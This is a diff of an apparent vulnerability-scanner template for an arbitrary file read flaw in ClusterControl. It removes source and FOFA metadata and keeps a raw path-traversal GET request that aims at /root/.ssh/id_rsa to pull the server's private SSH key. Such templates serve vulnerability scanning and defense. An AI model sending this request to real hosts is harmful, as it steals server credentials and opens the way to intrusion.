@@ -3,12 +3,8 @@ info:
   name: ClusterControl存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wsbvrewhgad4vbc2'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wsbvrewhgad4vbc2
-    fofa: title=="ClusterControl v2"
 http:
 - raw:
   - 'GET /../../../../../../../../..//root/.ssh/id_rsa HTTP/1.1
@@ -17,9 +13,7 @@ http:
 
     Accept-Encoding: identity
 
-    User-Agent: python-urllib3/1.26.4
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1723974018785-b1febffb-5b60-43e2-a757-fa9239dab6f4.png)'
+    User-Agent: python-urllib3/1.26.4'
   redirects: false
   matchers:
   - status:
